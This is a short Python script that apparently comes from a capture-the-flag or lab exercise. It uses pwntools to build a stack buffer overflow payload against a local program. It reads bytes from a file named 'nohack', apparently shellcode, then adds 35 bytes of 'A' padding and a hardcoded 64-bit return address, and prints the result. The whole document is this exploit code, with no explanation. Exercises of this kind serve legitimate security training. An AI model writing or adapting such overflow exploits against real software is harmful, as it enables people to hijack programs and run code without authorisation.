from pwn import *

payload = read('nohack')

payload += "A"*(35) # 72 - 37 
string = p64(0x7fffffffdf60)

print payload+string
